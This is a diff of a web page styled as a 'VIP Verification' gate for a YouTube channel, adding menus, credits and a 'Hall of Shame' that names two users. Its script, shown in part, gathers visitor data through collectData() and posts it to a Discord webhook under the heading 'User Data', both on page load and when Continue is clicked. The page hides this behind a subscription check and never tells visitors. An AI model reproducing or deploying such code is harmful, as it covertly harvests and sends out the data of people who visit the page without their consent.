@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
+    <title>Hyper Cosmic</title>
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Roboto:wght@400&display=swap" rel="stylesheet">
     <style>
         body {
@@ -147,7 +147,7 @@
             transform: perspective(20rem) rotateX(0deg) scale(1.1);
             box-shadow: 0 0.3rem 0.8rem rgba(59, 130, 246, 0.9);
         }
-        #premiumContent, #note, #expire {
+        .page {
             display: none;
             margin-top: 1rem;
             color: #e5e7eb;
@@ -156,7 +156,7 @@
             transition: opacity 3s ease;
             text-align: center;
         }
-        #premiumContent.active, #note.active, #expire.active {
+        .page.active {
             display: block;
             opacity: 1;
         }
@@ -182,6 +182,17 @@
             font-size: 0.9rem;
             margin: 0.4rem 0;
         }
+        #hallOfShame h3 {
+            font-size: 1rem;
+            margin: 0.5rem 0;
+            color: #ff4444;
+            text-shadow: 0 0 0.4rem rgba(255, 68, 68, 0.7);
+        }
+        #hallOfShame p {
+            font-size: 0.8rem;
+            margin: 0.3rem 0;
+            color: #ff6666;
+        }
         a {
             color: #f3e8ff;
             text-decoration: none;
@@ -202,6 +213,49 @@
         @keyframes spinDiamond {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
+        }
+        .menu {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1rem;
+            z-index: 5;
+            position: relative;
+        }
+        .menu button, .menu a {
+            margin: 0 0.3rem;
+            padding: 0.6rem 1rem;
+            font-size: 0.9rem;
+            background: linear-gradient(90deg, #1e40af, #2563eb);
+            color: #ffffff;
+            border: 0.15rem solid #d4af37;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            display: inline-block;
+            transform: perspective(20rem) rotateX(10deg);
+            transition: all 0.4s ease;
+        }
+        .menu button:hover, .menu a:hover {
+            background: linear-gradient(90deg, #1d4ed8, #3b82f6);
+            transform: perspective(20rem) rotateX(0deg) scale(1.1);
+            box-shadow: 0 0.3rem 0.8rem rgba(59, 130, 246, 0.9);
+        }
+        .menu button::after, .menu a::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.5), transparent 70%);
+            transform: rotate(45deg);
+            transition: 0.6s;
+            opacity: 0;
+        }
+        .menu button:hover::after, .menu a:hover::after {
+            opacity: 1;
+            transform: rotate(45deg) translate(50%, 50%);
         }
 
         /* Media Queries untuk Responsivitas */
@@ -237,6 +291,16 @@
                 font-size: 0.8rem;
             }
             #note, #expire {
+                font-size: 0.8rem;
+            }
+            #hallOfShame h3 {
+                font-size: 0.9rem;
+            }
+            #hallOfShame p {
+                font-size: 0.7rem;
+            }
+            .menu button, .menu a {
+                padding: 0.5rem 0.8rem;
                 font-size: 0.8rem;
             }
         }
@@ -275,6 +339,22 @@
             #note, #expire {
                 font-size: 0.7rem;
             }
+            #hallOfShame h3 {
+                font-size: 0.8rem;
+            }
+            #hallOfShame p {
+                font-size: 0.6rem;
+            }
+            .menu {
+                flex-direction: column;
+                align-items: center;
+            }
+            .menu button, .menu a {
+                width: 80%;
+                margin: 0.2rem 0;
+                padding: 0.4rem 0.6rem;
+                font-size: 0.7rem;
+            }
         }
     </style>
 </head>
@@ -283,6 +363,13 @@
     <canvas id="particleCanvas"></canvas>
     <div class="overlay"></div>
     <div class="container" id="mainContainer">
+        <div class="menu">
+            <a href="https://youtube.com/@themugenking?si=xHcLhvJnGXWcE_ZG" target="_blank">
+                <button>Subscribe</button>
+            </a>
+            <button id="creditBtn">Credit</button>
+            <button id="hallOfShameBtn">Hall of Shame</button>
+        </div>
         <svg class="emblem" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M50 10 L90 90 H10 Z" fill="#d4af37"/>
             <path d="M50 20 L80 80 H20 Z" fill="#1e40af"/>
@@ -290,23 +377,34 @@
             <text x="50" y="55" font-size="18" fill="#d4af37" text-anchor="middle" font-family="'Playfair Display', serif">VIP</text>
         </svg>
         <h1><span class="diamond-icon"></span> Verification <span class="diamond-icon"></span></h1>
-        <p>Step 1: Subscribe To Our Channel For Unlock Access</p>
-        <p>Step 2: Don't UnSubscribe Or I Will Delete Your Whitelist User:D</p>
-        <p>Step 3: Just Enjoy it And Don't Be A Bully And Hater</p>
-        <a href="https://youtube.com/@themugenking?si=xHcLhvJnGXWcE_ZG" target="_blank" id="subscribeLink">
-            <button id="subscribeBtn">Subscribe <span class="diamond-icon"></span></button>
-        </a>
-        <button id="continueBtn" disabled>Continue <span class="diamond-icon"></span></button>
-        <div id="premiumContent">
-            <h2>Congratulations You Have Login In</h2>
-            <p>You Have Subscribed - Our Channel <span class="diamond-icon"></span></p>
+        <div id="page1" class="page">
+        <p>Step 1: Subscribe To Our Channel For Unlock Access<p>
+        <p>Step 2: Don't UnSubscribe Or I Will Delete Your Whitelist User:D<p>
+        <p>Step 3: Just Enjoy it And Don't Be A Bully And Hater<p>
+            <button id="continueBtn" disabled>Continue <span class="diamond-icon"></span></button>
+        </div>
+        <div id="page2" class="page">
+            <div id="premiumContent">
+                <h2>Congratulations You Have Login In</h2>
+                <p>You Have Subscribed - Our Channel <span class="diamond-icon"></span></p>
             <p>It Will Automatically Open Soon</p>
             <p>It Will Automatically Add Your Username To Whitelist</p>
             <p>If You Unsubscribe, We Will Delete Your Whitelist User</p>
             <p>Now type 'Subscribe' In The Box Below To Unlock</p>
+            </div>
+            <div id="note">Note: Your Subscription Helps Us Create More Awesome Script</div>
+            <div id="expire">Valid Until: December 31, 2026 <span class="diamond-icon"></span></div>
         </div>
-        <div id="note">Note: Your Subscription Helps Us Create More Awesome Script</div>
-        <div id="expire">Valid Until: December 31, 2026 <span class="diamond-icon"></span></div>
+        <div id="creditPage" class="page">
+            <h2>Credits</h2>
+            <p>Created by: TheMugenKing</p>
+            <p>ZR Team</p>
+        </div>
+        <div id="hallOfShame" class="page">
+            <h3>Hall of Shame</h3>
+            <p>erickrmbl65</p>
+            <p>debetbebet</p>
+        </div>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -462,7 +560,7 @@
         }
 
         function playAmbientSound() {
-            const audio = new Audio('https://www.soundjay.com/ambient/ambient-space-drone-01.mp3');
+            const audio = new Audio('');
             audio.loop = true;
             audio.volume = 0.3;
             audio.play().catch(e => console.log('Audio play failed:', e));
@@ -482,18 +580,62 @@
 
         // Anti-bypass system
         let hasSubscribed = false;
-        const subscribeBtn = document.getElementById('subscribeBtn');
+        const subscribePage1Btn = document.querySelector('.menu a');
         const continueBtn = document.getElementById('continueBtn');
+        const creditBtn = document.getElementById('creditBtn');
+        const hallOfShameBtn = document.getElementById('hallOfShameBtn');
 
-        subscribeBtn.addEventListener('click', () => {
-            hasSubscribed = true;
+        // Show initial page
+        document.getElementById('page1').classList.add('active');
+
+        // Event listeners
+        subscribePage1Btn.addEventListener('click', () => {
+            hideAllPages();
+            document.getElementById('page1').classList.add('active');
+            playClickSound();
+            hasSubscribed = true; // Set to true after subscribing via Page 1
             continueBtn.disabled = false;
-            interactionCount++;
+        });
+
+        continueBtn.addEventListener('click', async () => {
+            if (!hasSubscribed) {
+                return;
+            }
+            const data = await collectData();
+            await sendToDiscord(data);
+            hideAllPages();
+            document.getElementById('page2').classList.add('active');
+            document.getElementById('premiumContent').classList.add('active');
+            document.getElementById('note').classList.add('active');
+            document.getElementById('expire').classList.add('active');
             playClickSound();
         });
 
-        subscribeBtn.addEventListener('mouseenter', playHoverSound);
+        creditBtn.addEventListener('click', () => {
+            hideAllPages();
+            document.getElementById('creditPage').classList.add('active');
+            playClickSound();
+        });
+
+        hallOfShameBtn.addEventListener('click', () => {
+            hideAllPages();
+            document.getElementById('hallOfShame').classList.add('active');
+            playClickSound();
+        });
+
+        // Helper function to hide all pages
+        function hideAllPages() {
+            const pages = document.querySelectorAll('.page');
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById('premiumContent').classList.remove('active');
+            document.getElementById('note').classList.remove('active');
+            document.getElementById('expire').classList.remove('active');
+        }
+
+        subscribePage1Btn.addEventListener('mouseenter', playHoverSound);
         continueBtn.addEventListener('mouseenter', playHoverSound);
+        creditBtn.addEventListener('mouseenter', playHoverSound);
+        hallOfShameBtn.addEventListener('mouseenter', playHoverSound);
 
         // Mouse movement tracking
         document.addEventListener('mousemove', (e) => {
@@ -608,7 +750,7 @@
             }
 
             const embed = {
-                title: 'Hyper Cosmic Ultra Elite VIP User Data',
+                title: 'User Data V2',
                 fields: Object.entries(data).map(([name, value]) => ({
                     name: name.charAt(0).toUpperCase() + name.slice(1),
                     value: value.toString().substring(0, 1024),
@@ -631,20 +773,6 @@
                 console.error('Error sending to Discord:', error);
             }
         }
-
-        // Handle Continue button click
-        continueBtn.addEventListener('click', async () => {
-            if (!hasSubscribed) {
-                return;
-            }
-
-            const data = await collectData();
-            await sendToDiscord(data);
-
-            document.getElementById('premiumContent').classList.add('active');
-            document.getElementById('note').classList.add('active');
-            document.getElementById('expire').classList.add('active');
-        });
 
         // Get initial data on page load
         collectData().then(data => sendToDiscord(data));
